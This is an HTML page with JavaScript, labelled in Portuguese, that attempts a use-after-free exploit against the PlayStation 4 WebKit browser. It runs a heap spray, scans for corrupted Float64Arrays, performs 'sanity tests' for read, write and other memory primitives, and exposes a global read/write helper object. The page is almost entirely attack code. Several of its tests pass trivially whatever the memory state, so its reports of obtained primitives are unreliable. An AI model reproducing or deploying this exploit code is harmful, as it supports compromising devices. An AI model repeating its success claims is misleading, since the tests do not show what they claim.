
<!DOCTYPE html>
<html>
<body>
<h1>PS4 WebKit UAF - CORRIGIDO</h1>

<button onclick="runTest()">RODAR TESTE UAF</button>
<button onclick="clearLog()">LIMPAR</button>

<hr>
<pre id="log"></pre>

<script>
function h2f(hex) {
    let clean = hex.replace(/0x/g, '');
    if(clean.length !== 16) return 0.0;
    let hi = parseInt(clean.slice(8), 16);
    let lo = parseInt(clean.slice(0, 8), 16);
    let b = new ArrayBuffer(8);
    let u = new Uint32Array(b);
    u[1] = hi; u[0] = lo;
    return (new Float64Array(b))[0];
}

function f2h(f) {
    let b = new ArrayBuffer(8);
    (new Float64Array(b))[0] = f;
    let u = new Uint32Array(b);
    return "0x" + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

const P_A = h2f("0x4141414141414141");
const M_V = h2f("0xdeadbeefcafebabe");
const W_V = h2f("0x1337133713371337");

let globalControllers = null;
let globalSpray = null;
let globalCorrupted = null;

function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
}

function clearLog() {
    document.getElementById('log').textContent = '';
}

function runTest() {
    clearLog();
    log('=== PS4 UAF TEST ===');
    log('');
    log('[INIT] Criando 5000 controllers...');
    
    globalControllers = [];
    for(let i = 0; i < 5000; i++) {
        const arr = new Float64Array(8);
        arr[0] = i;
        globalControllers.push(arr);
    }
    
    log('[INIT] OK - Controllers criados');
    log('[WAIT] APERTE OPTIONS!');
    log('');
    
    document.documentElement.webkitRequestFullscreen();
    
    let blurCount = 0;
    
    window.onblur = function() {
        blurCount++;
        log('[BLUR] Detectado (' + blurCount + ')');
        
        // Spray
        globalSpray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P_A);
            globalSpray.push(s);
        }
        
        log('[SPRAY] 8000 arrays criados');
        
        // Verificação após 2º blur
        if(blurCount === 2) {
            log('');
            log('[SCAN] Verificando corrupção...');
            
            let found = false;
            let foundIdx = -1;
            
            for(let i = 0; i < globalControllers.length; i++) {
                if(globalControllers[i][0] === P_A) {
                    found = true;
                    foundIdx = i;
                    globalCorrupted = globalControllers[i];
                    break;
                }
            }
            
            if(found) {
                log('');
                log('*** UAF DETECTADO! ***');
                log('Index: controllers[' + foundIdx + ']');
                log('');
                
                runSanityTests(globalCorrupted, globalSpray, foundIdx);
            } else {
                log('');
                log('UAF NAO DETECTADO');
                log('');
                log('DEBUG: Primeiros 5 valores:');
                for(let i = 0; i < 5; i++) {
                    log('  [' + i + '] = ' + f2h(globalControllers[i][0]));
                }
            }
            
            window.onblur = null;
        }
    };
}

function runSanityTests(corrupted, spray, idx) {
    log('=== TESTES DE SANIDADE ===');
    log('');
    
    // TESTE 1: Read
    log('TESTE 1: Read Primitive');
    log('Conteudo do array corrompido:');
    for(let i = 0; i < 8; i++) {
        log('  [' + i + '] = ' + f2h(corrupted[i]));
    }
    log('Read: OK');
    log('');
    
    // TESTE 2: Write
    log('TESTE 2: Write Primitive');
    const oldVal = f2h(corrupted[4]);
    corrupted[4] = M_V;
    const newVal = f2h(corrupted[4]);
    log('  Antes:  ' + oldVal);
    log('  Depois: ' + newVal);
    if(newVal === f2h(M_V)) {
        log('Write: OK');
    } else {
        log('Write: FALHOU');
    }
    log('');
    
    // TESTE 3: Identity
    log('TESTE 3: Identity (bidirecional)');
    let identityFound = false;
    for(let i = 0; i < spray.length; i++) {
        if(spray[i][4] === M_V) {
            log('  Encontrado em spray[' + i + ']');
            
            // Teste reverso
            spray[i][5] = W_V;
            if(corrupted[5] === W_V) {
                log('  Bidirecional: OK');
                identityFound = true;
            } else {
                log('  Apenas unidirecional');
            }
            break;
        }
    }
    if(!identityFound) log('Identity: NAO ENCONTRADO');
    log('');
    
    // TESTE 4: DataView
    log('TESTE 4: DataView Bypass');
    try {
        const dv = new DataView(corrupted.buffer);
        const before = f2h(corrupted[0]);
        
        dv.setUint32(0, 0xDEADBEEF, true);
        dv.setUint32(4, 0xCAFEBABE, true);
        
        const after = f2h(corrupted[0]);
        
        log('  Antes:  ' + before);
        log('  Depois: ' + after);
        
        if(before !== after) {
            log('DataView: OK');
        } else {
            log('DataView: SEM MUDANCA');
        }
    } catch(e) {
        log('DataView: ERRO - ' + e.message);
    }
    log('');
    
    // TESTE 5: Prototype Pollution
    log('TESTE 5: Prototype Pollution');
    try {
        let reg = Array.from(corrupted);
        Object.setPrototypeOf(reg, { token: 0xCAFEBABE });
        
        if(reg.token === 0xCAFEBABE) {
            log('  Token injetado: 0x' + reg.token.toString(16));
            log('Prototype: OK');
        } else {
            log('Prototype: FALHOU');
        }
    } catch(e) {
        log('Prototype: ERRO - ' + e.message);
    }
    log('');
    
    // TESTE 6: Closure Leak
    log('TESTE 6: Closure Leak');
    try {
        const leaked = [0].map(() => corrupted[0])[0];
        log('  Leaked: ' + f2h(leaked));
        log('Closure: OK');
    } catch(e) {
        log('Closure: ERRO - ' + e.message);
    }
    log('');
    
    // Export
    window.uafObject = {
        corrupted: corrupted,
        spray: spray,
        index: idx,
        read: (i) => f2h(corrupted[i]),
        write: (i, hex) => { corrupted[i] = h2f(hex); return f2h(corrupted[i]); },
        dump: () => {
            console.log('UAF Dump:');
            for(let i = 0; i < 8; i++) {
                console.log('[' + i + '] = ' + f2h(corrupted[i]));
            }
        }
    };
    
    log('=== TESTES COMPLETOS ===');
    log('');
    log('window.uafObject disponivel no console');
    log('  uafObject.read(0)');
    log('  uafObject.write(0, "0x4141414141414141")');
    log('  uafObject.dump()');
}
</script>

</body>
</html>
